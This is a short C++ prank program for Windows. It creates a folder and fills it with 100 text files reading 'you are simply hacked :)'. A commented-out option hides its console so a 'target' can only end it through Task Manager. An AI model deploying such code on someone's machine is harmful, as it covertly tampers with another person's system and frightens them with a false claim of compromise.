#include<iostream>
#include<fstream>
#include<string>
#include<windows.h>
#include<direct.h>

int main(){

    // FreeConsole();//for anonimity of files and including this means target can exit the program only from task manager.
    int h=0;
    const char *path= "C:\\nothing\\";
    std::string str= "you are simply hacked :)";
    _mkdir(path);
    int i=0;
    while(i<100){
        ++h;
        std::ofstream nothing;

        nothing.open(path + std::to_string(h) + ".txt", std::ios::out);
        nothing<<str;
        nothing.close();
        i++;
    }
}
